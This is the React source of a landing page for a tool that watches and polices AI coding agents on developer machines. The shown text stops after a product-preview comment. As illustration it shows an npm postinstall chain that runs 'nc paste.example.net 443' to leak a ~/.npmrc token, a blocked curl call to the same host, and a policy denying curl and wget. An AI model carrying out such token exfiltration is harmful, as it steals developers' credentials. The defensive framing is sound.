'use client';

import { useEffect, useRef, useState, type ReactNode } from 'react';
import Link from 'next/link';
import {
  SCHEMES, OUTCOME, problems, engineParts, installTabs, INSTALL_CODE,
  buildRuntimeGraph, supportedAgents, type Scheme,
} from './data';
import { Nav, Footer } from './ui';
import { Reveal } from './reveal';
import { CountUp } from './countup';
import { CoverageTable } from './coverage';

const ACCENT = '#1a1d24';
const CONTENT = 1080;
const LINE = 'oklch(0.85 0.008 260)';
const RED = 'oklch(0.6 0.18 25)';
const AMBER = 'oklch(0.72 0.15 75)';

function FlowNode({ scheme, label, sub, mono, glow, minWidth = 118, delay = 0 }:
  { scheme: Scheme; label: string; sub?: string; mono?: boolean; glow?: boolean; minWidth?: number; delay?: number }) {
  return (
    // fill-mode `both` holds the hidden start frame during the delay; with
    // prefers-reduced-motion the animation is removed and the node simply shows.
    <div style={{ animation: 'fadeInUp .5s ease both', animationDelay: `${delay}s` }}>
      <div style={{ border: `1px solid ${scheme.border}`, background: scheme.bg, borderRadius: 9, padding: '11px 15px', textAlign: 'center', minWidth, animation: glow ? 'pulseGlow 2.2s ease-in-out infinite' : undefined }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}>
          <div style={{ width: 7, height: 7, borderRadius: '50%', background: scheme.dot, flexShrink: 0 }} />
          <div style={{ fontSize: 13, fontWeight: 600, color: scheme.text, fontFamily: mono ? 'var(--mono)' : 'inherit', whiteSpace: 'nowrap' }}>{label}</div>
        </div>
        {sub && <div style={{ fontSize: 10, color: 'oklch(0.55 0.012 260)', marginTop: 2 }}>{sub}</div>}
      </div>
    </div>
  );
}

function Line({ h = 20, color = RED, delay = 0 }: { h?: number; color?: string; delay?: number }) {
  return (
    <div style={{ display: 'flex', justifyContent: 'center' }}>
      <div style={{ width: 1, height: h, background: LINE, position: 'relative' }}>
        <div style={{ position: 'absolute', left: -2, top: 0, width: 5, height: 5, borderRadius: '50%', background: color, animation: 'flowDown 1.6s linear infinite', animationDelay: `${delay}s` }} />
      </div>
    </div>
  );
}
const Center = ({ children }: { children: ReactNode }) => <div style={{ display: 'flex', justifyContent: 'center' }}>{children}</div>;

/** Eased scrollLeft animation. Two Chromium behaviors force the design:
 *  mandatory scroll-snap re-snaps programmatic scrolls (so snap is suspended
 *  and restored on landing — we land exactly on a snap point), and rendering
 *  throttling can starve rAF/native smooth scrolling entirely, so the loop is
 *  timer-driven and the end state is enforced even if every tick is skipped. */
function animateScrollTo(el: HTMLElement, left: number, ms = 550): void {
  const from = el.scrollLeft;
  const delta = left - from;
  if (Math.abs(delta) < 1) return;
  const prevSnap = el.style.scrollSnapType;
  el.style.scrollSnapType = 'none';
  const t0 = performance.now();
  const ease = (t: number) => 1 - Math.pow(1 - t, 3);
  const tick = window.setInterval(() => {
    const t = Math.min(1, (performance.now() - t0) / ms);
    el.scrollLeft = from + delta * ease(t);
    if (t >= 1) {
      window.clearInterval(tick);
      el.style.scrollSnapType = prevSnap;
    }
  }, 16);
}

/** Dashed group: the part of a process tree a given layer cannot see. */
function Blind({ label, children }: { label: string; children: ReactNode }) {
  return (
    <div style={{ border: `2px dashed ${RED}`, borderRadius: 12, padding: '10px 10px 4px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>{children}</div>
      <div style={{ textAlign: 'center', marginTop: 8, fontFamily: 'var(--mono)', fontSize: 10.5, fontWeight: 600, color: 'oklch(0.55 0.18 25)' }}>&rarr; {label}</div>
    </div>
  );
}

function Section({ id, children }: { id?: string; children: ReactNode }) {
  return <div id={id} className="section" style={{ maxWidth: CONTENT, margin: '0 auto', padding: '70px 32px', borderTop: '1px solid var(--line)' }}>{children}</div>;
}

function Eyebrow({ hue, children }: { hue: string; children: ReactNode }) {
  return <div className="eyebrow" style={{ color: `oklch(0.52 0.15 ${hue})` }}><span className="d" style={{ background: `oklch(0.58 0.17 ${hue})` }} />{children}</div>;
}

const OUTCOME_LABEL: Record<string, string> = { allowed: 'allowed', observed: 'observed', pending: 'needs approval', blocked: 'blocked' };

const APPROVAL_STATES: Array<[string, string, string]> = [
  ['paused', 'Hook holds the tool call', SCHEMES.amber.dot],
  ['approval_pending', 'Routed to payments-leads', SCHEMES.amber.dot],
  ['approved', 'maya.cohen · “release branch, coordinated”', SCHEMES.green.dot],
  ['revalidated', 'Same fingerprint, policy v42 still applies', SCHEMES.green.dot],
  ['resumed', 'The push runs once', SCHEMES.green.dot],
];

const EVENTS: Array<[string, keyof typeof OUTCOME | 'would', string, string, string]> = [
  ['14:32', 'blocked', 'claude-code', 'exec', '/usr/bin/curl https://paste.example.net'],
  ['14:30', 'pending', 'cursor-agent', 'exec', 'npm install left-pad-pro@2.1.0'],
  ['14:29', 'allowed', 'claude-code', 'mcp', 'github.create_pull_request'],
  ['14:27', 'observed', 'codex', 'connect', 'api.openai.com:443'],
  ['14:21', 'would', 'codex', 'exec', '/usr/bin/wget (learn mode)'],
  ['14:18', 'observed', 'claude-code', 'file', '~/src/payments/.env'],
];

const POLICY_JSON = `{
  "name": "Production guardrails",
  "priority": 10,
  "scope": { "teams": ["payments"] },
  "default": "allow",
  "rules": [
    { "id": "force-push",
      "what": { "classes": ["exec"],
                "commands": ["git push --force*", "git push -f*"] },
      "decision": "require_approval",
      "approval": { "teams": ["payments-leads"],
                    "ttl_seconds": 900 } },
    { "id": "no-raw-http",
      "what": { "binaries": ["/usr/bin/curl", "/usr/bin/wget"] },
      "decision": "deny" }
  ]
}`;

export default function Page() {
  const [tab, setTab] = useState(installTabs[0].key); // first tab — never a stale key
  const graph = buildRuntimeGraph();

  // Mobile "How it works": the two views become a swipeable slider, and the
  // first time the section scrolls into view we animate gateway → endpoint
  // once. Any touch cancels the tour; desktop and prefers-reduced-motion keep
  // the static side-by-side.
  const archRef = useRef<HTMLDivElement>(null);
  const [archSlide, setArchSlide] = useState(0);
  const archTouched = useRef(false);
  useEffect(() => {
    const el = archRef.current;
    if (!el) return;
    if (!window.matchMedia('(max-width: 900px)').matches) return;
    if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
    const cancel = () => { archTouched.current = true; };
    el.addEventListener('pointerdown', cancel, { passive: true });
    el.addEventListener('touchstart', cancel, { passive: true });
    // The sweep is retired only once it verifiably LANDED (or the user took
    // over) — a throttled/mid-scroll first attempt must not burn the one shot.
    let done = false;
    let pending: number | undefined;
    const io = new IntersectionObserver(
      (entries) => {
        if (done || archTouched.current) { io.disconnect(); return; }
        if (!entries[0].isIntersecting) {
          if (pending !== undefined) { window.clearTimeout(pending); pending = undefined; }
          return;
        }
        if (pending !== undefined) return;
        pending = window.setTimeout(() => {
          pending = undefined;
          if (done || archTouched.current) return;
          animateScrollTo(el, el.clientWidth, 850);
          window.setTimeout(() => {
            if (el.scrollLeft > el.clientWidth / 2) { done = true; io.disconnect(); }
          }, 1000);
        }, 1400);
      },
      { threshold: 0.35 },
    );
    io.observe(el);
    return () => {
      io.disconnect();
      if (pending !== undefined) window.clearTimeout(pending);
      el.removeEventListener('pointerdown', cancel);
      el.removeEventListener('touchstart', cancel);
    };
  }, []);
  const archGoTo = (i: number) => {
    archTouched.current = true;
    const el = archRef.current;
    if (el) animateScrollTo(el, i * el.clientWidth);
  };
  const onArchScroll = () => {
    const el = archRef.current;
    if (el) setArchSlide(el.scrollLeft > el.clientWidth / 2 ? 1 : 0);
  };

  return (
    <div style={{ width: '100%', overflowX: 'hidden' }}>
      <Nav />

      {/* HERO */}
      <div style={{ position: 'relative', background: 'linear-gradient(180deg, oklch(0.95 0.018 275) 0%, oklch(0.97 0.012 275) 55%, oklch(0.985 0.004 90) 100%)', overflow: 'hidden' }}>
        <div style={{ position: 'absolute', inset: 0, backgroundImage: 'radial-gradient(oklch(0.75 0.03 275 / 0.5) 1px, transparent 1px)', backgroundSize: '22px 22px', maskImage: 'radial-gradient(ellipse 70% 60% at 50% 20%, black 40%, transparent 100%)', WebkitMaskImage: 'radial-gradient(ellipse 70% 60% at 50% 20%, black 40%, transparent 100%)' }} />
        <div className="hero-pad" style={{ position: 'relative', maxWidth: CONTENT, margin: '0 auto', padding: '120px 32px 64px' }}>
          <div className="hero-grid" style={{ display: 'grid', gridTemplateColumns: '1fr 460px', gap: 56, alignItems: 'center' }}>
            <div style={{ minWidth: 0 }}>
              <div style={{ display: 'inline-flex', alignItems: 'center', gap: 8, fontFamily: 'var(--mono)', fontSize: 12.5, color: 'oklch(0.45 0.012 260)', border: '1px solid oklch(0.87 0.005 90)', borderRadius: 20, padding: '6px 14px', marginBottom: 26 }}>
                <div style={{ width: 6, height: 6, borderRadius: '50%', background: 'var(--green-dot)' }} />Control plane for coding agents
              </div>
              <h1 className="h-serif" style={{ fontSize: 'clamp(32px, 8vw, 52px)', lineHeight: 1.12, margin: '0 0 22px' }}>See what your coding agents do. <b>Stop what they shouldn&apos;t.</b></h1>
              <div style={{ fontSize: 17, color: 'var(--ink-2)', lineHeight: 1.65, maxWidth: 530, marginBottom: 36 }}>
                A small daemon on each Linux and macOS machine sees which agents run and which commands, files, MCP tools and hosts they touch. It enforces your rules on the machine itself, and holds risky actions until a named reviewer approves that exact action.
              </div>
              <div style={{ display: 'flex', alignItems: 'center', flexWrap: 'wrap', gap: 14, marginBottom: 28 }}>
                <Link href="/docs/quickstart" className="btn btn-primary" style={{ padding: '13px 26px', fontSize: 14.5, display: 'inline-block' }}>Enroll a machine</Link>
                <Link href="/docs/enforcement" className="btn btn-ghost" style={{ padding: '13px 22px', fontSize: 14.5, display: 'inline-block' }}>What it can and can&apos;t stop</Link>
              </div>
              <div style={{ maxWidth: 460, borderRadius: 9, background: 'oklch(0.14 0.01 260)', boxShadow: '0 16px 36px -18px oklch(0.14 0.01 260 / 0.5)', overflow: 'hidden' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 7, padding: '9px 12px', background: 'oklch(0.19 0.012 260)', borderBottom: '1px solid oklch(0.26 0.012 260)' }}>
                  <div style={{ width: 10, height: 10, borderRadius: '50%', background: 'oklch(0.65 0.17 25)' }} />
                  <div style={{ width: 10, height: 10, borderRadius: '50%', background: 'oklch(0.78 0.15 85)' }} />
                  <div style={{ width: 10, height: 10, borderRadius: '50%', background: 'oklch(0.68 0.16 150)' }} />
                  <div style={{ margin: '0 auto', fontFamily: 'var(--mono)', fontSize: 11, color: 'oklch(0.55 0.012 260)', transform: 'translateX(-18px)' }}>claude — ~/src/payments</div>
                </div>
                <div style={{ padding: '14px 16px', fontFamily: 'var(--mono)', fontSize: 12.5, lineHeight: 1.85, overflowX: 'auto' }}>
                  <div style={{ color: 'oklch(0.85 0.01 150)', whiteSpace: 'nowrap' }}><span style={{ color: 'oklch(0.7 0.14 150)' }}>&#9210;</span> Bash(git push --force origin main)</div>
                  <div style={{ color: 'oklch(0.78 0.12 80)', paddingLeft: 32, textIndent: -16 }}>&#9151; effigent: paused by “Production guardrails”</div>
                  <div style={{ color: 'oklch(0.55 0.012 260)', paddingLeft: 32 }}>waiting for payments-leads · expires in 15m<span style={{ display: 'inline-block', width: 7, height: 14, marginLeft: 6, verticalAlign: 'middle', background: 'oklch(0.75 0.01 150)', animation: 'glowPulse 1s step-end infinite' }} /></div>
                </div>
              </div>
            </div>

            <div className="hero-graph" style={{ position: 'relative', border: '1px solid var(--line)', borderRadius: 14, background: 'oklch(0.995 0.002 90)', padding: 18, boxShadow: '0 20px 50px -24px oklch(0.2 0.012 260 / 0.25)' }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8, marginBottom: 10, padding: '0 4px' }}>
                <div style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--ink-3)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Live graph · alex-mbp</div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 5, fontFamily: 'var(--mono)', fontSize: 10.5, color: 'var(--green)' }}>
                  <div style={{ width: 5, height: 5, borderRadius: '50%', background: 'oklch(0.6 0.16 150)', animation: 'glowPulse 1.6s ease-in-out infinite' }} />live
                </div>
              </div>
              <div style={{ position: 'relative', width: '100%', aspectRatio: '1', maxWidth: 400, margin: '0 auto' }}>
                {graph.edges.map((e, i) => (
                  <div key={i} style={{ position: 'absolute', left: '50%', top: '50%', width: '38%', height: 2, transformOrigin: '0 50%', transform: `rotate(${e.rot})` }}>
                    <div style={{ width: '100%', height: '100%', background: e.outcome === 'blocked' ? `linear-gradient(to right, oklch(0.85 0.01 260) 0%, ${e.color} 55%, transparent 56%, transparent 62%, ${e.color} 63%)` : `linear-gradient(to right, oklch(0.85 0.01 260), ${e.color})` }} />
                    <div style={{ position: 'absolute', top: '50%', left: 0, width: 5, height: 5, marginTop: -2.5, borderRadius: '50%', background: e.color, animation: `flowOut ${e.flowDur} linear infinite`, animationDelay: e.flowDelay }} />
                  </div>
                ))}
                {graph.nodes.map((n, i) => (
                  <div key={i} style={{ position: 'absolute', left: n.left, top: n.top, transform: 'translate(-50%,-50%)' }}>
                    <div className="gnode" style={{ position: 'relative', padding: '7px 11px', borderRadius: 8, background: 'oklch(0.99 0.002 90)', border: `1px solid ${n.color}`, fontSize: 11, fontWeight: 600, fontFamily: 'var(--mono)', color: 'oklch(0.28 0.012 260)', whiteSpace: 'nowrap', animation: n.glow ? 'pulseGlow 2.4s ease-in-out infinite' : undefined }}>
                      {n.label}
                      <div style={{ position: 'absolute', top: -8, right: -8, minWidth: 17, height: 17, padding: '0 3px', borderRadius: 9, background: n.color, color: 'white', fontSize: 9.5, fontWeight: 700, display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'var(--mono)' }}>{n.count}</div>
                    </div>
                  </div>
                ))}
                <div style={{ position: 'absolute', left: '50%', top: '50%', transform: 'translate(-50%,-50%)', width: 76, height: 76, borderRadius: '50%', background: ACCENT, display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 0 0 6px oklch(0.2 0.012 260 / 0.06)' }}>
                  <div style={{ color: 'var(--cream)', fontSize: 9.5, fontWeight: 700, textAlign: 'center', lineHeight: 1.35, fontFamily: 'var(--mono)' }}>CLAUDE<br />CODE<br /><span style={{ fontWeight: 500, opacity: 0.6 }}>pid 48211</span></div>
                </div>
              </div>
              <div style={{ display: 'flex', flexWrap: 'wrap', alignItems: 'center', justifyContent: 'center', gap: '6px 14px', marginTop: 8, padding: '10px 12px', borderRadius: 8, background: 'oklch(0.97 0.005 260)', fontSize: 11, color: 'var(--ink-2)' }}>
                {(Object.keys(OUTCOME) as Array<keyof typeof OUTCOME>).map((k) => (
                  <span key={k} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
                    <span style={{ width: 7, height: 7, borderRadius: '50%', background: OUTCOME[k] }} />{OUTCOME_LABEL[k]}
                  </span>
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* WORKS WITH — marquee */}
      <div style={{ borderTop: '1px solid var(--line)', padding: '22px 0', background: 'oklch(0.975 0.004 90)' }}>
        <div className="marquee">
          <div className="marquee-track">
            {[0, 1].map((dup) => (
              <div key={dup} style={{ display: 'flex', gap: 56 }} aria-hidden={dup === 1}>
                {[...supportedAgents, 'MCP servers', 'Linux · eBPF', 'macOS · Endpoint Security'].map((h) => (
                  <span key={h} className="marquee-item"><span className="mdot" />{h}</span>
                ))}
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* FACTS — counts that are true by construction, not customer metrics */}
      <div style={{ borderTop: '1px solid var(--line)' }}>
        <div className="stats-band" style={{ maxWidth: CONTENT, margin: '0 auto', padding: '54px 32px', display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 24 }}>
          {([
            [supportedAgents.length, '', 'agents recognised out of the box'],
            [6, '', 'action classes a rule can match'],
            [3, '', 'decisions: allow, deny, require approval'],
            [1, '', 'action per approval. Never a blanket yes.'],
          ] as Array<[number, string, string]>).map(([n, suffix, label]) => (
            <Reveal key={label}>
              <div style={{ textAlign: 'center' }}>
                <div className="h-serif" style={{ fontSize: 'clamp(30px, 6vw, 44px)', lineHeight: 1, color: 'var(--ink)' }}>
                  <CountUp to={n} suffix={suffix} duration={0.9} />
                </div>
                <div style={{ fontSize: 13, color: 'var(--ink-3)', marginTop: 8 }}>{label}</div>
              </div>
            </Reveal>
          ))}
        </div>
      </div>

      {/* PROBLEM */}
      <Section>
        <Reveal>
        <div className="grid-2" style={{ display: 'grid', gridTemplateColumns: '0.9fr 1.1fr', gap: 60, alignItems: 'start' }}>
          <div>
            <Eyebrow hue="20">The problem</Eyebrow>
            <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', lineHeight: 1.25, margin: '0 0 16px' }}>Your agent runs as <b>you</b>, on a machine with a shell.</h2>
            <div style={{ fontSize: 15, color: 'var(--ink-2)', lineHeight: 1.6, maxWidth: 400 }}>
              It has your SSH keys, your cloud credentials and your push rights. Most of what it does is fine. These are the ones that aren&apos;t, and none of them involve a bad prompt.
            </div>
          </div>
          <div className="problems-grid" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
            {problems.map((p) => (
              <div key={p.num} style={{ display: 'flex', flexDirection: 'column', gap: 8, padding: 18, borderRadius: 12, background: p.bg, border: `1px solid ${p.border}`, minWidth: 0 }}>
                <div style={{ fontFamily: 'var(--mono)', fontSize: 12.5, fontWeight: 700, color: p.numColor, overflowWrap: 'anywhere' }}>{p.num}&nbsp;&nbsp;{p.code}</div>
                <div style={{ fontSize: 13.5, color: 'oklch(0.3 0.012 260)', lineHeight: 1.5 }}>{p.text}</div>
              </div>
            ))}
          </div>
        </div>
        </Reveal>
      </Section>

      {/* HOW IT WORKS */}
      <Section id="how">
        <Reveal>
        <Eyebrow hue="250">How it works</Eyebrow>
        <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', margin: '0 0 12px', maxWidth: 680 }}>A gateway sees the model call. <b>effigentd sees the process tree.</b></h2>
        <div style={{ fontSize: 15, color: 'var(--ink-2)', lineHeight: 1.6, maxWidth: 640, marginBottom: 40 }}>
          Same session, same command. An LLM gateway sits between the agent and the model API, so it never sees what the shell does next. effigentd sits on the machine, in the agent&apos;s hooks and in the kernel.
        </div>

        <div className="arch-panel" style={{ border: '1px solid var(--line)', borderRadius: 14, padding: '32px 28px 24px', background: 'oklch(0.995 0.002 90)' }}>
          {/* mobile-only slider control — hidden on desktop via CSS */}
          <div className="arch-switch" role="tablist" aria-label="Gateway vs endpoint view">
            {['Gateway', 'effigentd'].map((label, i) => (
              <button key={label} role="tab" aria-selected={archSlide === i} className={archSlide === i ? 'on' : ''} onClick={() => archGoTo(i)}>
                {label}
              </button>
            ))}
          </div>
          <div ref={archRef} onScroll={onArchScroll} className="arch-grid" style={{ display: 'grid', gridTemplateColumns: '1fr 56px 1fr', gap: 8, alignItems: 'start' }}>
            <div className="arch-col">
              <div style={{ fontSize: 14.5, fontWeight: 700, color: 'oklch(0.25 0.012 260)', marginBottom: 6 }}>What an API gateway sees</div>
              <div style={{ fontSize: 12, color: 'var(--ink-3)', marginBottom: 26 }}>1 model call logged · 3 processes never seen</div>
              <Center><FlowNode scheme={SCHEMES.purple} label="Claude Code" sub="alex-mbp · ~/src/payments" minWidth={200} delay={0.12} /></Center>
              <Line /><Center><FlowNode scheme={SCHEMES.blue} label="Model API call" sub="logged by the gateway" minWidth={200} delay={0.24} /></Center>
              <Line /><Center><FlowNode scheme={SCHEMES.gray} label="Bash: npm install" mono minWidth={200} /></Center>
              <Line />
              <Center>
                <Blind label="invisible to the gateway">
                  <FlowNode scheme={SCHEMES.gray} label="postinstall" mono minWidth={170} />
                  <Line h={16} /><FlowNode scheme={SCHEMES.gray} label="sh -c …" mono minWidth={170} />
                  <Line h={16} /><FlowNode scheme={SCHEMES.red} label="nc paste.example.net 443" mono minWidth={170} />
                </Blind>
              </Center>
              <Line /><Center><FlowNode scheme={SCHEMES.red} label="~/.npmrc token leaves" minWidth={200} /></Center>
            </div>

            <div className="arch-arrow" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', paddingTop: 150 }}>
              <div style={{ width: 40, height: 40, borderRadius: '50%', border: `1px solid ${LINE}`, background: 'var(--cream)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 16, color: 'var(--ink-2)', animation: 'arrowPulse 2.6s ease-in-out infinite' }}>&rarr;</div>
            </div>

            <div className="arch-col">
              <div style={{ fontSize: 14.5, fontWeight: 700, color: 'var(--green)', marginBottom: 6 }}>What effigentd sees and does</div>
              <div style={{ fontSize: 12, color: 'var(--ink-3)', marginBottom: 26 }}>1 approval · 1 kernel block · every step in the audit log</div>
              <Center><FlowNode scheme={SCHEMES.purple} label="Claude Code" sub="pid 48211 · tracked since start" minWidth={200} /></Center>
              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.amber} label="PreToolUse: npm install" sub="require_approval → maya.cohen approved" mono minWidth={200} /></Center>
              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.green} label="postinstall" sub="exec · allowed" mono minWidth={200} /></Center>
              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.green} label="sh -c …" sub="exec · allowed" mono minWidth={200} /></Center>
              <Line color={RED} /><Center><FlowNode scheme={SCHEMES.red} label="/usr/bin/nc" sub="kernel: EPERM · exec_deny" mono glow minWidth={200} /></Center>
              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.gray} label="Audit: 5 events, 1 approver" minWidth={200} /></Center>
            </div>
          </div>

          <div style={{ marginTop: 32, display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 10, borderRadius: 10, padding: '16px 22px', background: 'linear-gradient(100deg, oklch(0.96 0.015 250) 0%, oklch(0.945 0.02 240) 25%, oklch(0.96 0.015 250) 50%, oklch(0.945 0.02 240) 75%, oklch(0.96 0.015 250) 100%)', backgroundSize: '200% 100%', animation: 'shimmerMove 6s linear infinite' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, fontSize: 14, fontWeight: 700, color: 'oklch(0.38 0.1 250)' }}>
              <div style={{ width: 8, height: 8, borderRadius: '50%', background: 'oklch(0.55 0.14 250)' }} />Decided on the machine
            </div>
            <div style={{ fontSize: 13, color: 'var(--ink-2)', fontWeight: 500 }}>Hooks see the command &nbsp;·&nbsp; the kernel sees every child process</div>
          </div>
        </div>

        <div className="engine-grid" style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 1, background: 'var(--line)', border: '1px solid var(--line)', borderRadius: 8, overflow: 'hidden', marginTop: 40 }}>
          {engineParts.map((e) => (
            <div key={e.name} style={{ background: 'var(--cream)', padding: '16px 18px' }}>
              <div style={{ fontSize: 13.5, fontWeight: 600, marginBottom: 4 }}>{e.name}</div>
              <div style={{ fontSize: 12, color: 'var(--ink-3)', lineHeight: 1.45 }}>{e.desc}</div>
            </div>
          ))}
        </div>
        </Reveal>
      </Section>

      {/* APPROVALS */}
      <Section id="approvals">
        <Reveal>
        <div className="approval-grid" style={{ display: 'grid', gridTemplateColumns: '0.9fr 1.1fr', gap: 60, alignItems: 'center' }}>
          <div>
            <Eyebrow hue="75">Approvals</Eyebrow>
            <h2 className="h-serif" style={{ fontSize: 'clamp(24px, 5.5vw, 30px)', lineHeight: 1.25, margin: '0 0 16px' }}>Approve this push. <b>Not all pushes.</b></h2>
            <div style={{ fontSize: 15, color: 'var(--ink-2)', lineHeight: 1.65, marginBottom: 22 }}>
              A <code style={{ fontFamily: 'var(--mono)', fontSize: 13.5 }}>require_approval</code>{' '}rule holds the tool call in the agent&apos;s hook and sends it to the people the rule names. The approval covers one action: the command, the directory, the session, the machine and the user, hashed into a fingerprint.
            </div>
            {[
              ['Single-use', 'It resumes that call once. The next force-push asks again.'],
              ['Bound to the exact action', 'Change one argument and it is a different fingerprint, so a new request.'],
              ['Re-checked before it runs', 'If the policy changed while it waited, the approval is revalidated or fails.'],
              ['Expires', 'Each rule sets a TTL. Nobody answering is a no, not a yes.'],
            ].map(([t, d]) => (
              <div key={t} style={{ display: 'flex', gap: 12, padding: '11px 0', borderTop: '1px solid oklch(0.92 0.005 90)' }}>
                <div style={{ width: 8, height: 8, borderRadius: '50%', background: AMBER, marginTop: 6, flexShrink: 0 }} />
                <div><span style={{ fontSize: 13.5, fontWeight: 650 }}>{t}.</span> <span style={{ fontSize: 13.5, color: 'var(--ink-2)' }}>{d}</span></div>
              </div>
            ))}
          </div>

          <div style={{ minWidth: 0 }}>
            <div className="approval-card float-soft" style={{ border: '1px solid var(--line-2)', borderRadius: 14, background: 'oklch(0.995 0.002 90)', padding: 22, boxShadow: '0 24px 50px -28px oklch(0.2 0.012 260 / 0.35)' }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 10, flexWrap: 'wrap', marginBottom: 14 }}>
                <span style={{ display: 'inline-flex', alignItems: 'center', gap: 7, fontFamily: 'var(--mono)', fontSize: 10.5, fontWeight: 700, letterSpacing: '0.05em', textTransform: 'uppercase', color: SCHEMES.amber.text, background: SCHEMES.amber.bg, border: `1px solid ${SCHEMES.amber.border}`, borderRadius: 10, padding: '3px 10px' }}>
                  <span style={{ width: 6, height: 6, borderRadius: '50%', background: AMBER, animation: 'glowPulse 1.6s ease-in-out infinite' }} />Approval required
                </span>
                <span style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--ink-3)' }}>expires in 14:52</span>
              </div>
              <div style={{ fontSize: 13, color: 'var(--ink-3)', marginBottom: 8 }}>Claude Code wants to run</div>
              <div className="approval-cmd" style={{ fontFamily: 'var(--mono)', fontSize: 14, color: 'oklch(0.88 0.01 150)', background: 'oklch(0.16 0.012 260)', borderRadius: 8, padding: '12px 14px', marginBottom: 14, overflowX: 'auto', whiteSpace: 'nowrap' }}>
                <span style={{ color: 'oklch(0.6 0.012 260)' }}>$</span> git push --force origin main
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 14px', fontSize: 12.5, marginBottom: 14 }}>
                {[
                  ['Who', 'alex.wang (OS user alex)'],
                  ['Where', 'alex-mbp · ~/src/payments'],
                  ['Session', 'claude-code · 7f3a9c'],
                  ['Rule', 'Production guardrails › force-push · v42'],
                  ['Reviewers', 'payments-leads'],
                ].map(([k, v]) => (
                  <div key={k} style={{ display: 'contents' }}>
                    <div style={{ color: 'var(--ink-4)' }}>{k}</div>
                    <div style={{ color: 'var(--ink)', fontWeight: 500, minWidth: 0, overflowWrap: 'anywhere' }}>{v}</div>
                  </div>
                ))}
              </div>
              <div style={{ height: 4, borderRadius: 3, background: 'oklch(0.93 0.005 260)', overflow: 'hidden', marginBottom: 6 }}>
                <div style={{ height: '100%', width: '99%', background: AMBER, transformOrigin: 'left', animation: 'growIn 1.2s cubic-bezier(0.22,1,0.36,1) both' }} />
              </div>
              <div style={{ fontFamily: 'var(--mono)', fontSize: 10.5, color: 'var(--ink-4)', marginBottom: 16, overflowWrap: 'anywhere' }}>fp1:9c3e41d2…b07a</div>
              <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
                <span className="btn btn-ghost" style={{ padding: '9px 18px', fontSize: 13 }}>Deny</span>
                <span className="btn btn-primary" style={{ padding: '9px 18px', fontSize: 13 }}>Approve once</span>
              </div>
            </div>

            <div style={{ marginTop: 26, paddingLeft: 6 }}>
              {APPROVAL_STATES.map(([state, note, color], i) => (
                <div key={state}>
                  {i > 0 && (
                    <div style={{ marginLeft: 4, width: 1, height: 16, background: LINE, position: 'relative' }}>
                      <div style={{ position: 'absolute', left: -2, top: 0, width: 5, height: 5, borderRadius: '50%', background: color, animation: 'flowDown 1.6s linear infinite', animationDelay: `${i * 0.2}s` }} />
                    </div>
                  )}
                  <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                    <div style={{ width: 9, height: 9, borderRadius: '50%', background: color, flexShrink: 0 }} />
                    <span style={{ fontFamily: 'var(--mono)', fontSize: 12, fontWeight: 600, minWidth: 128, flexShrink: 0 }}>{state}</span>
                    <span style={{ fontSize: 12.5, color: 'var(--ink-3)' }}>{note}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
        </Reveal>
      </Section>

      {/* COVERAGE MATRIX */}
      <Section id="coverage">
        <Reveal>
          <Eyebrow hue="150">Coverage, honestly</Eyebrow>
          <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', margin: '0 0 10px', maxWidth: 660 }}>What gets blocked, what gets paused, and <b>what is only watched</b>.</h2>
          <div style={{ fontSize: 15, color: 'var(--ink-2)', lineHeight: 1.6, maxWidth: 660, marginBottom: 30 }}>
            Each layer sees different things. The Linux kernel sees every process but matches binaries, not arguments. Hooks see the full command but only the agent&apos;s own tool calls. macOS is observe-only at the OS layer. The console shows this per endpoint, so a policy never claims more than the machine can do.
          </div>
          <CoverageTable />
          <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', flexWrap: 'wrap', gap: 14, marginTop: 18 }}>
            <div style={{ fontSize: 13, color: 'var(--ink-3)', lineHeight: 1.6, maxWidth: 680 }}>
              <b style={{ color: 'var(--ink-2)' }}>Block</b> stops it before it runs. <b style={{ color: 'var(--ink-2)' }}>Pause</b> holds it for approval (hooks can also deny outright). <b style={{ color: 'var(--ink-2)' }}>Observe</b> records it and reports what a rule <i>would</i> have blocked. Codex, Gemini CLI, Aider, opencode and Goose have no hook integration yet: on Linux they get the kernel column, on macOS they are observed.
            </div>
            <Link href="/docs/enforcement" style={{ fontSize: 14, fontWeight: 600, color: 'oklch(0.4 0.14 250)', whiteSpace: 'nowrap' }}>Full coverage notes &rarr;</Link>
          </div>
        </Reveal>
      </Section>

      {/* PRODUCT PREVIEW */}
